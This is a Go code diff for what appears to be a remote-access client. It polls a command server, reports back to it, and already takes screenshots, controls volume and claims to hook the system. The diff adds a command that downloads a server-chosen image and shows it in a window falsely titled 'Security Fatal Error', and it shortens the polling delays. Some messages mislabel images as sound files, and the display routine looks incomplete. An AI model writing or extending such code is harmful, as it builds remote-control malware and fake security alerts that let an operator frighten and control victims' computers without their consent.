@@ -4,6 +4,9 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"image"
+	_ "image/gif"
+	_ "image/jpeg"
 	"image/png"
 	"io"
 	"net/http"
@@ -18,6 +21,7 @@ import (
 	"github.com/ebitengine/oto/v3"
 	"github.com/go-ole/go-ole"
 	"github.com/go-ole/go-ole/oleutil"
+	"github.com/gonutz/wui/v2"
 	"github.com/hajimehoshi/go-mp3"
 	"github.com/itchyny/volume-go"
 	"github.com/vova616/screenshot"
@@ -45,6 +49,53 @@ func fetchTunnelURL() string {
 	}
 
 	return strings.TrimSpace(string(body))
+}
+
+func displayImageNative(imgPath, durationSec string) error {
+	secs, err := strconv.Atoi(durationSec)
+	if err != nil {
+		return fmt.Errorf("invalid duration: %w", err)
+	}
+
+	// 1. Open and decode image with standard Go library
+	f, err := os.Open(imgPath)
+	if err != nil {
+		return fmt.Errorf("open file error: %w", err)
+	}
+	defer f.Close()
+
+	decodedImg, _, err := image.Decode(f)
+	if err != nil {
+		return fmt.Errorf("decode image error: %w", err)
+	}
+
+	// 2. Convert to wui image
+	wuiImg := wui.NewImage(decodedImg)
+	bounds := wuiImg.Bounds()
+
+	// 3. Setup window matching image dimensions
+	window := wui.NewWindow()
+	window.SetTitle("Security Fatal Error")
+	window.SetInnerSize(bounds.Width, bounds.Height)
+
+	// 4. Setup paintbox & drawing callback
+	paintBox := wui.NewPaintBox()
+	paintBox.SetBounds(0, 0, bounds.Width, bounds.Height)
+	paintBox.SetOnPaint(func(c *wui.Canvas) {
+		// Draw full source image at coordinates (0, 0)
+		c.DrawImage(wuiImg, bounds, 0, 0)
+	})
+	window.Add(paintBox)
+
+	// 5. Timer to close window automatically
+	time.AfterFunc(time.Duration(secs)*time.Second, func() {
+		window.Close()
+	})
+
+	// 6. Run native Win32 message loop (works inside VMs without OpenGL)
+	window.Show()
+
+	return nil
 }
 
 func ss() {
@@ -377,7 +428,7 @@ func main() {
 	for true {
 		userInput = fetchCommand()
 		command := strings.Fields(userInput)
-		time.Sleep(1 * time.Second)
+		time.Sleep(100 * time.Millisecond)
 
 		fmt.Printf("Received command from server: %s\n", userInput)
 		if len(command) != 0 {
@@ -432,8 +483,38 @@ func main() {
 					fmt.Println("System hooked successfully.")
 				}
 
+			case "img":
+				fmt.Println("Downloading sound file...")
+				err := downloadFile(command[1])
+				if err != nil {
+					fmt.Println("Error downloading sound file:", err)
+					reportProgress(serverIp, "Error downloading image")
+					break
+				}
+
+				fmt.Println("Displaying img")
+				reportProgress(serverIp, "Showing image...")
+				// Run your background work asynchronously
+				fmt.Println("Displaying img")
+
+				if err := displayImageNative(command[1], command[2]); err != nil {
+					fmt.Println("Error:", err)
+					err = os.Remove(command[1])
+					if err != nil {
+						fmt.Println("Error deleting sound file:", err)
+					}
+					return
+				}
+				err = os.Remove(command[1])
+				if err != nil {
+					fmt.Println("Error deleting sound file:", err)
+				}
+
+				fmt.Println("Image closed; the program continues.")
+				reportProgress(serverIp, "Image shown")
+
 			default:
-				time.Sleep(2 * time.Second)
+				time.Sleep(500 * time.Millisecond)
 
 				if strings.HasPrefix(userInput, "error") || strings.HasPrefix(userInput, "Error") {
 					mutex.Lock()
